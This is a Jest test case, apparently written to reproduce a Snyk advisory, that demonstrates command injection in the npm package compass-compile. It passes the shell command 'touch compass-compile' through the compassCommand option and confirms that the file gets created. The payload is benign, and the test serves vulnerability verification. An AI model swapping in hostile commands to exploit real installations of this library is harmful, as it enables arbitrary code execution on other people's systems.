//https://snyk.io/vuln/SNYK-JS-COMPASSCOMPILE-564429
test("Command Injection in compass-compile", () => {
  const Root = require("compass-compile");
  let root = new Root();
  const fs = require("fs");
  const path = "./compass-compile";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let options = {
    compassCommand: "touch compass-compile",
  };
  root.compile(options);
  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
